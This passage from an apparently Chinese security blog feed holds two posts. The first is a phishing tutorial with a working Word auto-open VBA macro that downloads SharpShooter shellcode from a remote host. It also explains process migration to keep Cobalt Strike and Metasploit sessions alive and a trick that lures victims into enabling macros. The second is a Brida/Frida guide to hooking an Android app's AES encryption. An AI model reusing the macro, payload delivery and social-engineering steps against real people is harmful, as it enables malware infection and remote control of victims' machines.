src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584781368230.png" alt="1584781368230"></p><p>生成的<code>foo.macro</code>内容很简单，代码如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line">    <span class="keyword">Set</span> XML = CreateObject(<span class="string">"Microsoft.XMLDOM"</span>)</span><br><span class="line">    XML.async = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">Set</span> xsl = XML</span><br><span class="line">    xsl.Load <span class="string">"http://192.168.0.104:80/foo.xsl"</span></span><br><span class="line">    XML.transformNode xsl</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>创建一个对象加载远程的xsl文件。如果需要使函数<code>Auto_Open()</code>加到<code>AutoOpen()</code>方法里，这样就可以在打开word文档的时间就能运行宏，具体代码如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">  Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line">    <span class="keyword">Set</span> XML = CreateObject(<span class="string">"Microsoft.XMLDOM"</span>)</span><br><span class="line">    XML.async = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">Set</span> xsl = XML</span><br><span class="line">    xsl.Load <span class="string">"http://192.168.0.104:80/foo.xsl"</span></span><br><span class="line">    XML.transformNode xsl</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p><code>foo.xsl</code>文件为<code>SharpShooter</code>处理后的shellcode。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584807351799.png" alt="1584807351799"></p><p>我们可以把<code>foo.xsl</code>传到自己的vps或者公共下载网站，然后修改vba代码中的地址即可。再讲vba代码加到word或着excel文档中即可。</p><h4><span id="进程迁移">进程迁移</span></h4><p>office宏加载远程的<code>.xsl</code>文件有个缺点就是，点击启用宏后word进程会崩掉，如word进程被结束了，Cobalt Strike或者Metasploit会掉线。所以我们要做的是，在目标上线的时候就自动迁移到其他进程上。</p><p>处理方法：</p><ul><li>Cobalt Strike：通过插件实现上线后自动迁移进程，<a href="https://github.com/threatexpress/aggressor-scripts/tree/d6bdbd587379d7da2a337d19cccdee1a8628d1d8/beacon_handler" target="_blank" rel="noopener">Beacon Handler Suite</a></li><li>Metasploit: 在设置监听的时间可以设置：<code>set autorunscript migrate -N explorer.exe 或 set autorunscript -f</code></li></ul><p>这样可以实现在word进程被关闭后，得到一个新的会话，即持久的控制目标。</p><h4><span id="演示视频">演示视频</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\bypass360.gif" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\bypasshr.gif" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\msf.gif" alt=""></p><h3><span id="引导性处理">引导性处理</span></h3><p>为了更好去引导目标启用宏可以如下处理：</p><p>第一步：进入开发工具，选择插入控件—其他控件—Microsoft RDP Client Control*</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584808968035.png" alt="1584808968035"></p><p>第二步：设置控件属性内的Sever为localhost StartConnection为1，即点开自启动</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584809056606.png" alt="1584809056606"></p><p>第三步：插入vba代码</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584809241553.png" alt="1584809241553"></p><p>设置完成后，启用宏的提示就变成了<code>部分活动内容已被禁用，启用内容。</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584809310487.png" alt="1584809310487"></p><p>这样就更好的去引导目标启用宏了。</p><h3><span id="总结">总结</span></h3><p>​        “站在巨人的肩膀上”，以上的思路和方法是最近一个星期在<code>github</code>、<code>twitter</code>和国内外的安全网站论坛上收集和测试得到的结果。然后自己做的一个总结，有兴趣的师傅可以自己研究<code>SharpShooter</code>这个项目，并关注我们的微信公众号，后续我们会继续分享一些思路和方法。</p><h3><span id="reference">Reference</span></h3><p><a href="https://www.secquan.org/Discuss/1070836" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070836</a></p><p><a href="https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/</a></p><p><a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/SharpShooter</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;前言&quot;&gt;前言&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;​        “打点越来越难了，社工钓鱼会是最常见的攻击手段，0day会是最有效的攻击手段，物理渗透会是危害最大的攻击手段“。&lt;/p&gt;
&lt;p&gt;在钓鱼攻击中木马的形式主要如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>frida-hook工具篇</title>
    <link href="https://uknowsec.cn/posts/notes/frida-hook%E5%B7%A5%E5%85%B7%E7%AF%87.html"/>
    <id>https://uknowsec.cn/posts/notes/frida-hook工具篇.html</id>
    <published>2020-02-06T10:09:17.000Z</published>
    <updated>2020-02-06T10:15:02.224Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="brida">Brida</span></h2><h3><span id="brida简介">Brida简介</span></h3><p>Brida是BurpSuite的一个插件，它可以将Burp和Frida结合起来使用，可以在 BurpSuite中直接调用目标应用程序中的加/解密函数，这样就可以根据你的需求修改移动端APP与服务器的通信流量。而不用去逆向它，从而节省测试人员的精力。</p><p><a href="https://github.com/federicodotta/Brida" target="_blank" rel="noopener">https://github.com/federicodotta/Brida</a></p><h3><span id="brida安装">Brida安装</span></h3><p>Brida目前只支持python 2.7。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br><span class="line">pip install pyro4</span><br></pre></td></tr></table></figure><p>Brida可以直接从BurpSuite中安装</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580895376662.png" alt="1580895376662"></p><h3><span id="brida功能模块">Brida功能模块</span></h3><h4><span id="brida控制台">Brida控制台</span></h4><p>填好配置项后先点击<code>Start Server</code>然后在点击<code>Spawn application</code>。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580895596968.png" alt="1580895596968"><br>Brida由以下三部分组成：</p><ul><li><p>Brida.jar为Burpsuite插件；</p></li><li><p>bridaServicePyro是用于Frida适配到burpsuite上的python脚本，这一部分存储在插件中，在执行brida过程中复制到缓存文件夹中；</p></li><li><p>script.js是要注入到目标应用程序的javascript脚本，它会通过Frida带有的rpc.exports功能将信息返回到拓展程序中，同时该script.js脚本会被Frida注入到我们在 Brida中指定的进程中所以我们可以直接使用 Frida的API。</p></li></ul><p>  Brida的几个配置参数：</p><table><thead><tr><th>配置参数</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td>Python binary path</td><td style="text-align:left">即Python可执行程序路径，用于启动Pyro服务</td></tr><tr><td>Pyro host, Pyro port</td><td style="text-align:left">即Pyro 服务的主机以及端口，可以保持默认</td></tr><tr><td>Frida JS file path</td><td style="text-align:left">需要注入的Frida脚本存放的位置</td></tr><tr><td>Application ID</td><td style="text-align:left">目标进程名(APP的包名)</td></tr><tr><td>Frida Remote”/“Frida Loca</td><td style="text-align:left">如果您使用的是Frida USB操作模式，则必须选择“ Frida Local”。如果使用端口转发模式，则必须选择“ Frida Remote”。</td></tr></tbody></table><h4><span id="js编辑器">JS编辑器</span></h4><p>  可以实时对hook脚本进行编辑。</p><p>  <img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580897477541.png" alt="1580897477541"></p><h4><span id="analyze-binary">Analyze Binary</span></h4><p>切换到Analyze Binary，点击Load tree，然后可能会卡一会，因为在加载类列表，加载完点开Java，可以看到这个进程里的所有类，可在下面的搜索框直接搜crypt来找加解密类。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580899345827.png" alt="1580899345827"></p><p>其功能和TraceView 相似，我们在操作APP的时候，他会打印出所有加载的类和方法。</p><p>点开java下拉找到app包名通过一个一个插桩 然后进行提交测试 看响应框是否会有信息。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580901009778.png" alt="1580901009778"></p><p>通过插桩可以看到此方法前后的输入值与返回值，同时可以通过<code>change return value</code>修改方法返回值。</p><h4><span id="execute-method">Execute method</span></h4><p>在通用js脚本中的<code>rpc.exports</code>里帮写了四个<code>contextcustom</code>，这四个是给右键菜单预留的，<code>contextcustom1、contextcustom2</code>会出现在<code>repeater</code>等模块中<code>request</code>的右键菜单，<code>contextcustom2、contextcustom3</code>则会出现在<code>response</code>的右键菜单。主要就是为了实现手动加解密的功能。这四个函数接收的参数都是hex形式的，所以返回的时候也要转成hex再传出去。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580901402956.png" alt="1580901402956"></p><p>例如：我们掉模块中调用函数contextcustom1返回值为上面代码中的6566。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580901465948.png" alt="1580901465948"></p><h4><span id="generate-stubs">Generate stubs</span></h4><p>这里可以生成java/python代码，<code>METHOD_NAME</code>你要调用hook脚本的函数，即如上的contextcustom1，另外一处标红为参数列表。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580902444668.png" alt="1580902444668"></p><p>我们要实现的功能只是要让Repeater, Intruder and Scanner模块能对数据进行自动加/解密。</p><p>如下代码是brida官方文档给出的通用代码，我们只需修改调用的函数名和参数并对相关的加密解密数据进行处理即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">package burp;</span><br><span class="line"></span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line">import java.util.Arrays;</span><br><span class="line">import org.apache.commons.lang3.ArrayUtils;</span><br><span class="line">import net.razorvine.pyro.PyroProxy;</span><br><span class="line">import net.razorvine.pyro.PyroURI;</span><br><span class="line"></span><br><span class="line">public class BurpExtender implements IBurpExtender, IHttpListener &#123;</span><br><span class="line">  private PrintWriter stdout;</span><br><span class="line">  private PrintWriter stderr;    </span><br><span class="line">  private IBurpExtenderCallbacks callbacks;</span><br><span class="line">  private IExtensionHelpers helpers;</span><br><span class="line">    </span><br><span class="line">  public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) &#123;</span><br><span class="line">    // Set the name of the extension</span><br><span class="line">    callbacks.setExtensionName(&quot;Brida Demo Search Plugin&quot;);</span><br><span class="line">    // Initialize stdout and stderr (configurable from the Extension pane)</span><br><span class="line">    stdout = new PrintWriter(callbacks.getStdout(), true);</span><br><span class="line">    stderr = new PrintWriter(callbacks.getStderr(), true);  </span><br><span class="line">    // Save references to useful objects</span><br><span class="line">    this.callbacks = callbacks;</span><br><span class="line">    this.helpers = callbacks.getHelpers();</span><br><span class="line">    // Register ourselves as an HttpListener, in this way all requests and responses will be forwarded to us</span><br><span class="line">    callbacks.registerHttpListener(this);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) &#123;</span><br><span class="line">    </span><br><span class="line">    // Process only Repeater, Scanner and Intruder requests</span><br><span class="line">    if(toolFlag == IBurpExtenderCallbacks.TOOL_SCANNER || </span><br><span class="line">       toolFlag == IBurpExtenderCallbacks.TOOL_REPEATER ||</span><br><span class="line">       toolFlag == IBurpExtenderCallbacks.TOOL_INTRUDER) &#123;</span><br><span class="line">      </span><br><span class="line">      // Modify &quot;test&quot; parameter of Repeater requests</span><br><span class="line">      if(messageIsRequest) &#123;</span><br><span class="line">        // Get request bytes</span><br><span class="line">        byte[] request = messageInfo.getRequest();</span><br><span class="line">        // Get a IRequestInfo object, useful to work with the request</span><br><span class="line">        IRequestInfo requestInfo = helpers.analyzeRequest(request);</span><br><span class="line">        // Get &quot;test&quot; parameter</span><br><span class="line">        IParameter contentParameter = helpers.getRequestParameter(request, &quot;content&quot;);</span><br><span class="line">        if(contentParameter != null) &#123;</span><br><span class="line">          String urlDecodedContentParameterValue = helpers.urlDecode(contentParameter.getValue());</span><br><span class="line">          String ret = &quot;&quot;;</span><br><span class="line">          // Ask Brida to encrypt our attack vector</span><br><span class="line">          String pyroUrl = &quot;PYRO:BridaServicePyro@localhost:9999&quot;;</span><br><span class="line">          try &#123;</span><br><span class="line">            PyroProxy pp = new PyroProxy(new PyroURI(pyroUrl));</span><br><span class="line">            ret = (String)pp.call(&quot;callexportfunction&quot;,&quot;encryptrequest&quot;,new String[]&#123;urlDecodedContentParameterValue&#125;);</span><br><span class="line">            pp.close();</span><br><span class="line">          &#125; catch(Exception e) &#123;</span><br><span class="line">            stderr.println(e.toString());</span><br><span class="line">            StackTraceElement[] exceptionElements = e.getStackTrace();</span><br><span class="line">            for(int i=0; i&lt; exceptionElements.length; i++) &#123;</span><br><span class="line">              stderr.println(exceptionElements[i].toString());</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          // Create the new parameter</span><br><span class="line">          IParameter newTestParameter = helpers.buildParameter(contentParameter.getName(), helpers.urlEncode(ret), contentParameter.getType());</span><br><span class="line">          // Create the new request with the updated parameter</span><br><span class="line">          byte[] newRequest = helpers.updateParameter(request, newTestParameter);</span><br><span class="line">          // Update the messageInfo object with the modified request (otherwise the request remains the old one)</span><br><span class="line">          messageInfo.setRequest(newRequest);</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">      // Response</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        // Get request bytes in order to check if the request contain &quot;content&quot; parameter</span><br><span class="line">        byte[] request = messageInfo.getRequest();</span><br><span class="line">        IRequestInfo requestInfo = helpers.analyzeRequest(request);</span><br><span class="line">        IParameter contentParameter = helpers.getRequestParameter(request, &quot;content&quot;);</span><br><span class="line">        if(contentParameter != null) &#123;</span><br><span class="line">          // Get response bytes</span><br><span class="line">          byte[] response = messageInfo.getResponse();</span><br><span class="line">          // Get a IResponseInfo object, useful to work with the request</span><br><span class="line">          IResponseInfo responseInfo = helpers.analyzeResponse(response);</span><br><span class="line">          // Get the offset of the body</span><br><span class="line">          int bodyOffset = responseInfo.getBodyOffset();</span><br><span class="line">          // Get the body (byte array and String)</span><br><span class="line">          byte[] body = Arrays.copyOfRange(response, bodyOffset, response.length);</span><br><span class="line">          String bodyString = helpers.bytesToString(body);</span><br><span class="line">          String ret = &quot;&quot;;</span><br><span class="line">          // Ask Brida to decrypt the response</span><br><span class="line">          String pyroUrl = &quot;PYRO:BridaServicePyro@localhost:9999&quot;;</span><br><span class="line">          try &#123;</span><br><span class="line">            PyroProxy pp = new PyroProxy(new PyroURI(pyroUrl));</span><br><span class="line">            ret = (String)pp.call(&quot;callexportfunction&quot;,&quot;decryptresponse&quot;,new String[]&#123;bodyString&#125;);</span><br><span class="line">            pp.close();</span><br><span class="line">          &#125; catch(Exception e) &#123;</span><br><span class="line">            stderr.println(e.toString());</span><br><span class="line">            StackTraceElement[] exceptionElements = e.getStackTrace();</span><br><span class="line">            for(int i=0; i&lt; exceptionElements.length; i++) &#123;</span><br><span class="line">              stderr.println(exceptionElements[i].toString());</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          // Update the messageInfo object with the modified request (otherwise the request remains the old one)</span><br><span class="line">          byte[] newResponse = ArrayUtils.addAll(Arrays.copyOfRange(response, 0, bodyOffset),ret.getBytes());</span><br><span class="line">          messageInfo.setResponse(newResponse);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="实战">实战</span></h3><p>如图app对数据进行了加密。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580902822525.png" alt="1580902822525"></p><p>这里我们可以通过直接分析APK或者通过Hook来看他是使用的什么加密，且调用的是那个类的那个方法。</p><p>逆向APP可以知道调用的类和方法。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580903281942.png" alt="1580903281942"></p><p>同时得到加密密钥为：<code>9876543210123456</code></p><p>我们可以利用Execute method模块进行函数调用测试。修改contextcustom1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contextcustom1: function(message) &#123;</span><br><span class="line">        console.log(&quot;Brida  Java Starting script ----&gt;ok&quot;);</span><br><span class="line">        var enc;</span><br><span class="line">        Java.perform(function () &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                var key = &quot;9876543210123456&quot;;</span><br><span class="line">                var text = &quot;admin&quot;;</span><br><span class="line">                //hook class</span><br><span class="line">                var AesEncryptionBase64 = Java.use(&apos;com.ese.http.encrypt.AesEncryptionBase64&apos;);</span><br><span class="line">                console.log(&quot;Brida start : encrypt before---&gt;&quot;+text);</span><br><span class="line">                //hook method</span><br><span class="line">                enc = AesEncryptionBase64.encrypt(key,text);</span><br><span class="line">                console.log(&quot;Brida start : encrypt after---&gt;&quot;+enc);</span><br><span class="line"></span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                console.log(&quot;[!]Exception:&quot; + error.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return enc;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580903583962.png" alt="1580903583962"></p><p>如上是hook<code>com.ese.http.encrypt.AesEncryptionBase64</code>类的<code>encrypt</code>方法，并传入key值和加密内容。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580904137989.png" alt="1580904137989"></p><p>可得到加密后的密文。</p><p>4个方法与请求数据包与返回数据包相互一 一对应：</p><ul><li>Brida Custom 1：通过右键菜单进行访问，它会调用contextcustom1 JS脚本；</li><li>Brida Custom 2：通过右键菜单进行访问，它会调用contextcustom2 JS脚本；</li><li>Brida Custom 3：通过右键菜单进行访问，它会调用contextcustom3 JS脚本；</li><li>Brida Custom 4：通过右键菜单进行访问，它会调用contextcustom4 JS脚本。</li></ul><p>编写加密解密脚本：（函数接收的参数和返回的数据都是以 16进制编码的，所以我们使用时要先对他们进行16进制解码，然后返回的时候在进行16进制编码。）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">//AesEncryptionBase64 encrypt</span><br><span class="line">contextcustom1: function (message) &#123;</span><br><span class="line">    console.log(&quot;Brida start :0---&gt;&quot; + message);</span><br><span class="line">    var data = hexToString(message)</span><br><span class="line">    console.log(&quot;Brida start :1---&gt;&quot; + data);</span><br><span class="line">    var enc;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            var key = &quot;9876543210123456&quot;;</span><br><span class="line">            var text = data;</span><br><span class="line">            //hook class</span><br><span class="line">            var AesEncryptionBase64 = Java.use(&apos;com.ese.http.encrypt.AesEncryptionBase64&apos;);</span><br><span class="line">            console.log(&quot;Brida start : AesEncryptionBase64 ---&gt; success&quot;);</span><br><span class="line">            console.log(&quot;Brida start : encrypt before---&gt;&quot;+text);</span><br><span class="line">            //hook method</span><br><span class="line">            enc = AesEncryptionBase64.encrypt(key,text);</span><br><span class="line">            console.log(&quot;Brida start : encrypt after---&gt;&quot;+enc);</span><br><span class="line"></span><br><span class="line">        &#125; catch (error) &#123;</span><br><span class="line">            console.log(&quot;[!]Exception:&quot; + error.message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    return stringToHex(enc);</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">//AesEncryptionBase64 decrypt</span><br><span class="line">contextcustom2: function (message) &#123;</span><br><span class="line">    console.log(&quot;Brida start :0---&gt;&quot; + message);</span><br><span class="line">    var data = hexToString(message)</span><br><span class="line">    console.log(&quot;Brida start :1---&gt;&quot; + data);</span><br><span class="line">    var text;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            var key = &quot;9876543210123456&quot;;</span><br><span class="line">            var enc = data;</span><br><span class="line">            //hook class</span><br><span class="line">            var AesEncryptionBase64 = Java.use(&apos;com.ese.http.encrypt.AesEncryptionBase64&apos;);</span><br><span class="line">            console.log(&quot;Brida start : AesEncryptionBase64 ---&gt; success&quot;);</span><br><span class="line">            console.log(&quot;Brida start : decrypt before---&gt;&quot;+enc);</span><br><span class="line">            //hook method</span><br><span class="line">            text = AesEncryptionBase64.decrypt(key,enc);</span><br><span class="line">            console.log(&quot;Brida start : decrypt after---&gt;&quot;+text);</span><br><span class="line">        &#125; catch (error) &#123;</span><br><span class="line">            console.log(&quot;[!]Exception:&quot; + error.message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    console.log(&quot;Brida start : decrypt after---&gt;&quot;+stringToHex(text));</span><br><span class="line">    return stringToHex(text);</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">//AesEncryptionBase64 encrypt</span><br><span class="line">contextcustom3: function (message) &#123;</span><br><span class="line">    console.log(&quot;Brida start :0---&gt;&quot; + message);</span><br><span class="line">    var data = hexToString(message)</span><br><span class="line">    console.log(&quot;Brida start :1---&gt;&quot; + data);</span><br><span class="line">    var enc;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            var key = &quot;9876543210123456&quot;;</span><br><span class="line">            var text = data;</span><br><span class="line">            //hook class</span><br><span class="line">            var AesEncryptionBase64 = Java.use(&apos;com.ese.http.encrypt.AesEncryptionBase64&apos;);</span><br><span class="line">            console.log(&quot;Brida start : AesEncryptionBase64 ---&gt; success&quot;);</span><br><span class="line">            console.log(&quot;Brida start : encrypt before---&gt;&quot;+text);</span><br><span class="line">            //hook method</span><br><span class="line">            enc = AesEncryptionBase64.encrypt(key,text);</span><br><span class="line">            console.log(&quot;Brida start : encrypt after---&gt;&quot;+enc);</span><br><span class="line"></span><br><span class="line">        &#125; catch (error) &#123;</span><br><span class="line">            console.log(&quot;[!]Exception:&quot; + error.message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    return stringToHex(enc);</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">//AesEncryptionBase64 decrypt</span><br><span class="line">contextcustom4: function (message) &#123;</span><br><span class="line">    console.log(&quot;Brida start :0---&gt;&quot; + message);</span><br><span class="line">    var data = hexToString(message)</span><br><span class="line">    console.log(&quot;Brida start :1---&gt;&quot; + data);</span><br><span class="line">    var text;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            var key = &quot;9876543210123456&quot;;</span><br><span class="line">            var enc = data;</span><br><span class="line">            //hook class</span><br><span class="line">            var AesEncryptionBase64 = Java.use(&apos;com.ese.http.encrypt.AesEncryptionBase64&apos;);</span><br><span class="line">            console.log(&quot;Brida start : AesEncryptionBase64 ---&gt; success&quot;);</span><br><span class="line">            console.log(&quot;Brida start : decrypt before---&gt;&quot;+enc);</span><br><span class="line">            //hook method</span><br><span class="line">            text = AesEncryptionBase64.decrypt(key,enc);</span><br><span class="line">            console.log(&quot;Brida start : decrypt after---&gt;&quot;+text);</span><br><span class="line">        &#125; catch (error) &#123;</span><br><span class="line">            console.log(&quot;[!]Exception:&quot; + error.message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    console.log(&quot;Brida start : decrypt after---&gt;&quot;+stringToHex(text));</span><br><span class="line">    return stringToHex(text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换脚本里的contextcustom函数。</p><p>这样就能在burpsuite中进行右键菜单转换了。</p><p><img 